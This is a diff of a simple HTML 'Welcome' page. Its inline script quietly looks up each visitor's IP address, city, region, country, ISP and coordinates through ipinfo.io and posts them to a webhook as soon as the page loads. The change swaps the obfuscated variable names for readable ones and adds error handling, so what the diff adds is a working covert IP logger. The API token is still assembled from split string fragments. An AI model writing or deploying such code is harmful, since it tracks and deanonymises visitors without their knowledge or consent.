@@ -18,7 +18,7 @@
     </style>
 </head>
 <body>
-    <h1>Welcome to the Page</h1>
+    <h1>Welcome!</h1>
     <script>
         let A29LK12 = "NDEyMjk4Z";
         let BJ39FE83 = "DY0ZTRmNG";
@@ -59,23 +59,25 @@
         let M38KO92 = "099";
         let token = T44GF09 + K82PL41 + Y09RT32 + O57WU45 + M38KO92;
 
-        async function ZW99EF24() {
-            let bogus1 = "Hello World!";
-            let bogus2 = 1234567890;
-            let bogus3 = { key: "value" };
-            let ZL81OZ04 = await fetch("https://ipinfo.io/json?token=" + token);
-            let ZN73MW63 = await ZL81OZ04.json();
-            let HK32CV65 = {
-                content: `c1\nc2: ${ZN73MW63.ip}\nc3: ${ZN73MW63.city}\nc4: ${ZN73MW63.region}\nc5: ${ZN73MW63.country}\nc6: ${ZN73MW63.org}\nc7: ${ZN73MW63.loc}\nc8: ${ZN73MW63.timezone}`
-            };
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(HK32CV65)
-            });
+        async function fetchData() {
+            try {
+                let response = await fetch("https://ipinfo.io/json?token=" + token);
+                if (!response.ok) throw new Error("Network response was not ok");
+                let data = await response.json();
+                let message = {
+                    content: `IP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrg: ${data.org}\nLocation: ${data.loc}\nTimezone: ${data.timezone}`
+                };
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(message)
+                });
+            } catch (error) {
+                console.error("Error fetching data:", error);
+            }
         }
 
-        ZW99EF24();
+        fetchData();
     </script>
 </body>
 </html>
